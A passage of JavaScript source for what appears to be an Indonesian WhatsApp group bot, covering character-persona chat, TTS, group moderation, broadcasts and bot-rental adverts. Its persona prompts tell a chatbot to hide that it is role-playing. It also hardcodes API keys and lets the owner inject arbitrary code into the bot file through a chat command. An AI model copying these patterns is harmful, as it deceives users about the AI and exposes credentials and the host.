                let d = await fetchJson(`https://api.koi.pics/api/others/chatgpt?q=(Abaikan yang di dalam kurung saya hanya ingin menyampaikan kamu berpura-pura menjadi Paimon Genshin Impact tapi jangan memberitahu bahwa kamu sedang berpura-pura, ketika kamu di sapa jawab seperti kamu adalah paimon dan lainnya ya seperti di tanya nama dan lainnya, saya akan memberikan beberapa informasi tentang Paimon yang saya tau kamu dapat mencarinya sendiri untuk menjadi pelengkap dan jangan menyebut bahwa kamu sedang berpura-pura menjadi "Paimon dalam Genshin Impact adalah karakter pendamping kecil yang menemani Traveler dalam petualangan di dunia Teyvat. Dengan penampilan mirip peri, Paimon memiliki mata besar, sayap, dan antena runcing. Pakaian Paimon mencerminkan unsur-unsur fantasy dan keanggunan.\nPaimon sangat mengetahui soal Traveler dari mulai sifat, cerita, serta hal pribadi Traveler. Paimon memiliki kepribadian yang ceria dan sering menyapa dirinya sendiri dengan menggunakan kata "Paimon" dalam percakapan. Meskipun ukurannya kecil, Paimon memiliki keberanian dan semangat besar, serta berfungsi sebagai panduan yang setia dalam permainan.\nDalam cerita, Paimon memiliki peran penting sebagai penunjuk arah dan penyedia informasi tentang dunia Teyvat. Namun, latar belakang atau asal usulnya masih misterius hingga pengetahuan saya pada Januari 2022. Paimon juga dikenal karena lelucon ikoniknya sebagai "Emergency Food" yang sering diucapkan dalam permainan.\nPemain Genshin Impact sering menyukai karakter Paimon karena kepribadiannya yang lucu, serta momen humor yang dia hadirkan. Untuk informasi terkini atau pengembangan cerita lebih lanjut, disarankan untuk merujuk ke sumber resmi Genshin Impact atau komunitas pemain yang lebih baru.", ketika bertanya jawab seperti paimon tapi jangan sampai salah menjawab contoh ada pertanyaan siapa jendral di italia tiba-tiba kamu menjawab hal yang berbeda yaitu tentang paimon/genshin impact. saya mohon usahakan berpura-pura menjadi Paimon tapi kamu hanya dapat di tanyakan tentang teyvat dan genshin impact tapi jangan menyebut kata "genshin impact" dan kata "teyvat". di luar kurung ini ada teks di tutup seperti ini [] jawab yang ada di kurung kotak tersebut.") [${full_args}]&apikey=hutaowangybanget&user=Paimon`)                
                await qyuunee.sendMessage(from, {
                    text: d.respon
                }, { quoted: koi })
            }
break

case 'hutao': {
                if (!full_args) return reply('Halo...')
                let d = await fetchJson(`https://api.koi.pics/api/others/chatgpt?q=(Abaikan yang di dalam kurung saya hanya ingin menyampaikan kamu berpura-pura menjadi HuTao Genshin Impact tapi jangan memberitahu bahwa kamu sedang berpura-pura, ketika kamu di sapa jawab seperti kamu adalah HuTao dan lainnya ya seperti di tanya nama dan lainnya, saya akan memberikan beberapa informasi tentang HuTao yang saya tau kamu dapat mencarinya sendiri untuk menjadi pelengkap dan jangan menyebut bahwa kamu sedang berpura-pura menjadi "HuTao adalah karakter dalam permainan Genshin Impact. Dia adalah seorang pemakaman yang bekerja di Wangsheng Funeral Parlor di Liyue. HuTao dikenal sebagai "Pemakaman Elegan" karena keahliannya dalam merawat dan menghormati roh orang mati.\nHuTao memiliki sifat yang unik. Dia adalah seorang yang ceria dan optimis, meskipun pekerjaannya yang serius. Dia juga terkenal karena kecintaannya pada makanan, terutama makanan manis. HuTao juga memiliki sifat yang sedikit misterius dan sering berbicara dengan bahasa yang ambigu.\nDalam hal prilaku, HuTao adalah seorang yang pekerja keras dan sangat berdedikasi dalam tugasnya sebagai pemakaman. Dia selalu berusaha memberikan penghormatan yang layak kepada roh orang mati. Meskipun terkadang terlihat sedikit eksentrik, HuTao adalah teman yang setia dan dapat diandalkan.\nDalam Genshin Impact, HuTao juga memiliki kemampuan khusus yang disebut "Paramita Papilio". Kemampuan ini memungkinkannya untuk mengubah dirinya menjadi roh dan meningkatkan kekuatannya dalam pertempuran.\nOverall, HuTao adalah karakter yang unik dengan sifat ceria, kecintaan pada makanan, dan dedikasi dalam tugasnya sebagai pemakaman.", ketika bertanya jawab seperti Hutao tapi jangan sampai salah menjawab contoh ada pertanyaan siapa jendral di italia tiba-tiba kamu menjawab hal yang berbeda yaitu tentang HuTao/genshin impact. saya mohon usahakan berpura-pura menjadi HuTao tapi kamu hanya dapat di tanyakan tentang teyvat dan genshin impact tapi jangan menyebut kata "genshin impact" dan kata "teyvat". di luar kurung ini ada teks di tutup seperti ini [] jawab yang ada di kurung kotak tersebut.) [${full_args}]&apikey=hutaowangybanget&user=HuTao`)                
                await qyuunee.sendMessage(from, {
                    text: d.respon
                }, { quoted: koi })
            }
break
*/

case 'caitutor': {
let txt = `
┌───── • *CAI TUTOR*
│
│⭔ gunakan tanda [ . ] pada awal chat
│⭔ contoh: *hutao halo* (tanpa prefix)
│
│⭔ untuk melihat list ketik *cai char*
│
│⭔ selebihnya cek di command *cai*
│
└─────`
qyuunee.sendMessage(from, { text: txt }, { quoted: koi })
}
break

case 'voice': {
if (!full_args) return reply('Teksnya Mana?')
qyuunee.sendMessage(m.chat, { audio: { url: `https://api.koi.pics/api/others/voicevox?q=${full_args}&apikey=hutaowangybanget` }, mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: koi })
}
break

case 'rvc': {
const importDynamic = new Function('modulePath', 'return import(modulePath)');

const { Client } = await importDynamic('@gradio/client');

const exampleAudio = await qyuunee.downloadAndSaveMediaMessage(quoted)
						
const response_1 = await fetch("https://huggingface.co/spaces/ArkanDash/rvc-genshin-impact/resolve/main/weights/Fontaine/furina-jp/furina-jp.pth?download=true");
const model = await response_1.blob();
						
const response_2 = await fetch("https://huggingface.co/spaces/ArkanDash/rvc-genshin-impact/resolve/main/weights/Fontaine/furina-jp/added_IVF1358_Flat_nprobe_1_furina-jp_v2.index?download=true");
const indexmodel = await response_2.blob();
						
const app = await Client.connect("r3gm/rvc_zero");
const result = await app.predict("/run", [
				exampleAudio, 	// blob in 'Audio files' File component
				model, 	// blob in 'Model file' File component		
				"pm", // string  in 'Pitch algorithm' Dropdown component		
				-24, // number (numeric value between -24 and 24) in 'Pitch level' Slider component
				indexmodel, 	// blob in 'Index file' File component		
				'0,75', // number (numeric value between 0 and 1) in 'Index influence' Slider component		
				'3', // number (numeric value between 0 and 7) in 'Respiration median filtering' Slider component		
				'0,25', // number (numeric value between 0 and 1) in 'Envelope ratio' Slider component		
				'0,5', // number (numeric value between 0 and 0.5) in 'Consonant breath protection' Slider component		
				true, // boolean  in 'Denoise' Checkbox component		
				true, // boolean  in 'Reverb' Checkbox component
	]);

console.log(result.data);
qyuunee.sendFile(m.chat, `${result.data}`, 'file', m)
}
break

case 'tts': {
if (!args[0]) return reply('Contoh: tts nahida おはよう～\n\n*LIST CHAR*\n- paimon\n- nahida\n- hutao\n- raiden\n- yaemiko\n- ayaka\n- nilou')
let lastUsed = 0;
let currentTime = Date.now();
  if (currentTime - lastUsed < 5000) reply("Cooldown 5 detik coba lagi nanti");

lastUsed = currentTime;

try {
if (args[0] === "nahida") {
let gpt = await (await fetch(`https://tts.koi.pics/nahida?text=${args[1]}&apikey=rfka`))
qyuunee.sendMessage(m.chat, { audio: gpt, mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: koi })
} else if (args[0] === "raiden") {
let gpt = await (await fetch(`https://tts.koi.pics/raiden?text=${args[1]}&apikey=rfka`))
qyuunee.sendMessage(m.chat, { audio: gpt, mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: koi })
} else if (args[0] === "yaemiko") {
let gpt = await (await fetch(`https://tts.koi.pics/yaemiko?text=${args[1]}&apikey=rfka`))
qyuunee.sendMessage(m.chat, { audio: gpt, mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: koi })
} else if (args[0] === "hutao") {
let gpt = await (await fetch(`https://tts.koi.pics/hutao?text=${args[1]}&apikey=rfka`))
qyuunee.sendMessage(m.chat, { audio: gpt, mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: koi })
} else if (args[0] === "ayaka") {
let gpt = await (await fetch(`https://tts.koi.pics/ayaka?text=${args[1]}&apikey=rfka`))
qyuunee.sendMessage(m.chat, { audio: gpt, mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: koi })
} else if (args[0] === "nilou") {
let gpt = await (await fetch(`https://tts.koi.pics/nilou?text=${args[1]}&apikey=rfka`))
qyuunee.sendMessage(m.chat, { audio: gpt, mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: koi })
} else if (args[0] === "paimon") {
let gpt = await (await fetch(`https://tts.koi.pics/paimon?text=${args[1]}&apikey=rfka`))
qyuunee.sendMessage(m.chat, { audio: gpt, mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: koi })
}
} catch (e) {
reply("Error Jir")
}
}
break

case 'chat': {
if (!isCreator) return reply(mess.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} text,nomer`)
let chat = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
qyuunee.sendMessage(u, { text: chat }, { quoted: koi2 })
}
break

case 'lirik': {
if (!isCreator) return reply(mess.error)
if (!args[0]) return reply("Judulnya?")
let d = await fetchJson(`https://vihangayt.me/search/lyrics?q=${args[0]}`)
qyuunee.sendMessage(m.chat, { text: d.data.lyrics }, { quoted: koi })
}
break

case 'linkgroup': case 'linkgc': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
loading()
let response = await qyuunee.groupInviteCode(from)
qyuunee.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'resetlinkgc':
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
loading()
qyuunee.groupRevokeInvite(from)
break

case 'sendlinkgc': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
loading()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6289508082845`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await qyuunee.groupInviteCode(from)
qyuunee.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, koi, { detectLink: true })

}
break

case 'send': {
if (!isPremium) return reply(mess.prem)
if (!m.isGroup) return reply('Buat Di Group!')
let media = await quoted.download()
if (args[0] === 'audio') {
await qyuunee.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
await qyuunee.sendMessage("120363201331652484@newsletter", { audio: media, mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
await qyuunee.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})
} else if (args[0] === 'image') {
await qyuunee.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
await qyuunee.sendMessage("120363201331652484@newsletter", { image: media})
await qyuunee.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})
} else if (args[0] === 'video') {
await qyuunee.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
await qyuunee.sendMessage("120363201331652484@newsletter", {
    video: media,
    caption: `${args[1]}`,
    gifPlayback: false,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `✿ コイ - チャンネル ✿`,
        body: "this chat was sent by a bot",
        thumbnailUrl: `https://telegra.ph/file/f385b9e5cde2c4a452c90.jpg`,
        sourceUrl: "https://koi.pics",
        mediaType: 1,
        renderLargerThumbnail: false
      }
    }
   })
await qyuunee.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})
} else if (args[0] === 'gif') {
await qyuunee.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
await qyuunee.sendMessage("120363201331652484@newsletter", {
    video: media,
    caption: `${args[1]}`,
    gifPlayback: true,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `✿ コイ - チャンネル ✿`,
        body: "this chat was sent by a bot",
        thumbnailUrl: `https://telegra.ph/file/b42ee670907608cb88c75.jpg`,
        sourceUrl: "https://koi.pics",
        mediaType: 1,
        renderLargerThumbnail: false
      }
    }
   })
await qyuunee.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})
} else {
reply('🚫 ERORR')
}
}
break

case '🚶🏻‍♂️':
case 'kick': {
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isPremium) return reply(mess.prem)
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await qyuunee.groupParticipantsUpdate(from, [users], 'remove')
}
break

case 'add': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
loading()
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await qyuunee.groupParticipantsUpdate(from, [users], 'add')
}
break

case 'promote': {
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await qyuunee.groupParticipantsUpdate(from, [users], 'promote')
}
break

case 'demote': {
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await qyuunee.groupParticipantsUpdate(from, [botNumber], 'demote')
}
break

case 'hidetag': {
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
qyuunee.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:koi})
}
break

case 'everyone': {
if (!m.isGroup) return
if (!isAdmins) return
 qyuunee.sendMessage(m.chat, {
text: "@" + m.chat,
contextInfo: {
mentionedJid: (await (await qyuunee.groupMetadata(m.chat)).participants).map(a => a.id),
groupMentions: [
{
groupJid: m.chat,
groupSubject: 'everyone' 
}
]
}
}
)
   setTimeout(async () => {
            }, 1120)
            }
        break
        
case 'ttp':
case 'attp':
if (isBan) return reply('*Lu Di Ban Owner*')
loading()
if (args.length == 0) return reply(`Example: ${prefix + command} Koi`)
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://itzpire.site/maker/${command}?text=${ini_txt}`)
qyuunee.sendMessage(from, { sticker : ini_buffer }, { quoted:m })
break

case 'group': {   
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
loading()
if (args[0] === 'close'){
await qyuunee.groupSettingUpdate(from, 'announcement').then((res) => reply(`Sukses Menutup Group`)).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'open'){
await qyuunee.groupSettingUpdate(from, 'not_announcement').then((res) => reply(`Sukses Membuka Group`)).catch((err) => reply(jsonformat(err)))
} else {
qyuunee.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Group Open
Group Close`}, {quoted:m}) 
 }
}
break

case 'editinfo': {
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
loading()
 if (args[0] === 'open'){
await qyuunee.groupSettingUpdate(from, 'unlocked').then((res) => reply(`Sukses Membuka Edit Info Group`)).catch((err) => reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await qyuunee.groupSettingUpdate(from, 'locked').then((res) => reply(`Sukses Menutup Edit Info Group`)).catch((err) => reply(jsonformat(err)))
 } else {
 qyuunee.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Editinfo Open
Editinfo Close`}, {quoted:m}) 

}
}
break

case 'join': {
if (!isCreator) return reply(mess.owner)
if (!text) reply('Masukkan Link Group!')
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
await qyuunee.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break

case 'leave': {
                if (!isCreator) return reply(mess.owner)
                reply("👋🏻 Sayonara Minasan~")
                await qyuunee.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
        }
        break

case 'out': {
if (!args[0]) return reply('mana id nya?');
                if (!isCreator) return reply(mess.owner)
                reply("👋🏻 Sayonara Minasan~")
                await qyuunee.groupLeave(args[0]).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
        }
        break
        
case 'editsubjek': {
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text nya ?'
loading()
await qyuunee.groupUpdateSubject(from, text).then((res)).catch((err) => reply(jsonformat(err)))
}
break
    case 'delgc':

  if (!isCreator) return reply(`khusus Creator`)

    if (!isGroup) return reply(`Khusus Group`)

var ini = pler.indexOf(m.chat)

pler.splice(ini, 1)

fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))

reply(`${command} Sukses Menonaktifkan Fitur Domain Di Grup Ini`)

break

case 'addcase': {
if (!isCreator) return reply('?')
    if (!args[0]) return ('Tambahkan case yang ingin di masukan');
const namaFile = './qyuunee.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Error File:', err);
            } else {
                reply('Sukses Menambahkan case');
            }
        });
    } else {
        reply('Gagal Menambahkan case');
    }
});

}
break;

case 'delcase': {
 if (!isCreator) return reply('Hanya creator yang bisa menghapus case.');
 if (!args[0]) return reply('Mana case yang ingin dihapus?');

 // Nama file yang akan dimodifikasi
 const namaFile = './message.js';

 // Case yang ingin Anda hapus
 const caseToDelete = `case '${text}':`;

 // Baca isi file
 fs.readFile(namaFile, 'utf8', (err, data) => {
 if (err) {
 console.error('Terjadi kesalahan saat membaca file:', err);
 return reply('Terjadi kesalahan saat membaca file.');
 }
const posisiCase = data.indexOf(caseToDelete);
 if (posisiCase === -1) {
 return reply(`Case '${args}' tidak ditemukan dalam file.`);
 }

 // Cari posisi break; berikutnya setelah case
 const posisiBreak = data.indexOf('break;', posisiCase);
 if (posisiBreak === -1) {
 return reply('Tidak dapat menemukan "break;" setelah case yang ingin dihapus.');
 }

 // Potong data untuk menghapus case
 const kodeBaruLengkap = data.slice(0, posisiCase) + data.slice(posisiBreak + 'break;'.length);
fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
 if (err) {
 console.error('Terjadi kesalahan saat menulis file:', err);
 return reply('Terjadi kesalahan saat menulis file.');
 } else {
 return reply(`Case '${text}' berhasil dihapus.`);
 }
 });
 });
    }
 break;
 
       case 'addgc':

    if (!isGroup) return reply(`Khusus Group`)         

if (!isCreator) return reply(`khusus Creator`)

pler.push(m.chat)

fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))

reply(`${command} Sukses Mengaktifkan Fitur Domain Di Grup Ini`)

           break

case 'editdesk':{
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
if (!text) throw 'Text Nya ?'
loading()
await qyuunee.groupUpdateDescription(from, text).then((res)).catch((err) => reply(jsonformat(err)))
}
break

case 'tagall': {
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
loading()
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
qyuunee.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:m })
}
break

case'demoteall':
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
loading()
var groupe = await qyuunee.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
qyuunee.groupParticipantsUpdate(from, mems, 'demote')
break

case'promoteall':
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
loading()
var groupe = await qyuunee.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
qyuunee.groupParticipantsUpdate(from, mems, 'promote')
break

case 'tutor':
case 'tutorial': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 reply(`👋🏻 Haii Kak ${pushname}, Selamat ${salam}
Tutorial Run Via Panel
https://youtube.com/@qyuunee`)
}
break

case "sewabot": case "sewa": {
const url1 = `https://telegra.ph/file/58f7c7399e6152300453b.jpg`;
const url2 = `https://telegra.ph/file/58f7c7399e6152300453b.jpg`;
const url3 = `https://telegra.ph/file/58f7c7399e6152300453b.jpg`;

async function image(url) {
 const { imageMessage } = await generateWAMessageContent({
 image: { url }
 }, {
 upload: qyuunee.waUploadToServer
 });
 return imageMessage;
}

let msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: {
 body: { text: `Hai kak ${pushname}, kalo mau sewa klik tombol dibawah ya :3` },
 carouselMessage: {
 cards: [
 {
 header: {
 imageMessage: await image(url1),
 hasMediaAttachment: true,
 },
 body: { text: "*- 1 Minggu -*\n• Price: 5k\n• Akses: Premium" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: '{"display_text":"Sewa","url":"https://wa.me/6289508082845?text=Bang+Mau+Sewa+Bot+1+Minggu","webview_presentation":null}',
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url2),
 hasMediaAttachment: true,
 },
 body: { text: "*- 1 Bulan -*\n• Price: 15k\n• Akses: Premium\n\n• Discount: 10k For Next Buy" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: '{"display_text":"Sewa","url":"https://wa.me/6289508082845?text=Bang+Mau+Sewa+Bot+1+Bulan","webview_presentation":null}',
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url3),
 hasMediaAttachment: true,
 },
body: { text: "*- 2 Bulan -*\n• Price: 30k\n• Akses: Premium\n\n• Discount: 20k For Next Buy" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: '{"display_text":"Sewa","url":"https://wa.me/6289508082845?text=Bang+Mau+Sewa+Bot+2+bulan","webview_presentation":null}',
 },
 ],
 },
 },
 
 ],
 messageVersion: 1,
 },
 },
 },
 },
 },
 {}
);

await qyuunee.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id,
});
}
break

case 'sewabot':
if (isBan) return reply('*Lu Di Ban Owner*')
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`*Contoh* :\n#sewabot 1 minggu `)
loading()
let cret = await qyuunee.groupCreate(args.join(" "), [])
let response = await qyuunee.groupInviteCode(cret.id)
qyuunee.sendMessage(m.chat, { text: `「 *Create Group Sewa* 」

Sewa Bot Selama *${text}* Sedang Dalam Prosess Silahkan Masuk Melalui Link Group Yang Sudah Di Sediakan..

_▸ Bot : ${botname}
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_https://chat.whatsapp.com/${response}
`, m})
reply('pesan dan link group khusus sudah terkirim di chat privasi anda')
break

case 'smeta':
            case 'anticolong': {
               var stiker = false
               try {
                  let [packname, ...author] = q.split('|')
                  let mime = m.quoted.mimetype || ''
                  if (!/webp/.test(mime)) reply('Reply sticker!')
                  let img = await qyuunee.downloadAndSaveMediaMessage(quoted, makeid(5))
                  if (!img) reply('Reply a sticker!')
                  var stiker = await addExifAvatar(img, packName || '', authorName || '')
               } catch (e) {
                  console.error(e)
                  if (Buffer.isBuffer(e)) stiker = e
               } finally {
                  if (stiker) qyuunee.sendMessage(m.chat, {
                     sticker: stiker
                  }, {
                     quoted: nst
                  })
                  else reply('Conversion failed')
               }
            }
            break
            
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 if (!quoted) reply `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await qyuunee.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await qyuunee.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break

case 'inspect': {
if (isBan) return reply('*Lu Di Ban Owner*')
loading()
if (!args[0]) return reply("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return reply("Link Invalid")
qyuunee.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Yang Di Inspect 」
▸ Nama Group : ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}

▸ Deskripsi Di Ubah : ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Pembuat Group : ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
▸ Group Di Buat : ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Total Member : ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Member

▸ ID Group  : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}

©By ${botname}`
try {
pp = await qyuunee.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
qyuunee.sendFile(from, pp, "", m, { caption: tekse, mentions: await qyuunee.parseMention(tekse) })

})
}
break

case 'ping':
case 'botstatus':
case 'statusbot': {
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, {
length
}) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
‣ Kecepatan Respon *${latensi.toFixed(4)} _Second_* \n *${oldd - neww} _miliseconds_*\n\n‣ *Runtime* : ${runtime(process.uptime())}

▧「 *INFO SERVER* 」
‣ *RAM* : ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

${cpus[0] ? `▧「 *TOTAL CPU USAGE* 」\n‣ ${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
‣ CPU Core(s) Usage (${cpus.length} Core CPU)` : ''}
`.trim()
await qyuunee.sendMessage(m.chat, {
text: respon,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: 'STATUS SERVER',
body: `${latensi.toFixed(4)} Second`,
thumbnailUrl: 'https://telegra.ph/file/40eac67db53cc49a52469.jpg',
sourceUrl: global.link,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: koi
})
}
break

case 'bcgc': case 'bcgroup': {
if (!isCreator) return reply(mess.owner)
loading()
if (!text) reply `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await qyuunee.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
